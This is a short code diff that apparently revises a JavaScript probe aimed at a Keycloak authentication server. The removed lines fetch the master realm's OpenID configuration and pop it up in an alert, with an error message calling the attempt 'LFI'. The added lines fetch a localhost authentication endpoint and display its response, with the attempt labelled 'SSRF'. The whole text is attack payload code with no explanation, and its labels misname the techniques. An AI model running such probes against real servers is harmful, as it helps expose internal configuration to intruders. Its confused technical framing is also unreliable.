@@ -1,6 +1,4 @@
-fetch('/auth/realms/master/.well-known/openid-configuration')
-  .then(response => response.json())
-  .then(data => {
-    alert(JSON.stringify(data));  // Display internal config data
-  })
-  .catch(error => alert('LFI Failed: ' + error.message));
+fetch('http://localhost:8080/auth/realms/master/protocol/openid-connect/auth')
+  .then(response => response.text())
+  .then(data => alert(data))
+  .catch(error => alert('SSRF Failed: ' + error.message));
